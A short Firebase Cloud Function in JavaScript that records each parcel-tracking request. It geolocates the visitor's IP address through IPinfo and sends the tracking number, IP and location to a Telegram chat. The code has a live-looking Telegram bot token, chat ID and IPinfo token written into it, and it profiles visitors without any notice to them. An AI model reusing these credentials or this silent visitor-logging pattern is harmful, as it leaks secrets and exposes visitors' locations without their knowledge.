/* eslint-disable no-undef */
const functions = require("firebase-functions");
const axios = require("axios");

// 🔧 Replace these with your real values
const TELEGRAM_BOT_TOKEN = "7965726939:AAG2QWAWM6njIi7JFx9HCeor0j4oJmsYkxE";
const TELEGRAM_CHAT_ID = "1960001210";
const IPINFO_TOKEN = "58cbe42405a6c6";

// 📦 Cloud Function: trackVisitor
exports.trackVisitor = functions.https.onRequest(async (req, res) => {
  try {
    if (req.method !== "POST") {
      return res.status(405).send("Only POST requests are allowed.");
    }

    const trackingNumber = req.body.trackingNumber;
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.connection.remoteAddress;

    // 🌍 Get location from IPinfo
    const locationRes = await axios.get(`https://ipinfo.io/${ip}?token=${IPINFO_TOKEN}`);
    const location = locationRes.data;

    const message = `📦 New Tracking Request\n\nTracking Number: ${trackingNumber}\nIP: ${ip}\nLocation: ${location.city}, ${location.region}, ${location.country}`;

    // 📬 Send to Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    res.status(200).send("Alert sent successfully!");
  } catch (error) {
    console.error("Error:", error);
    res.status(500).send("Failed to send alert.");
  }
});
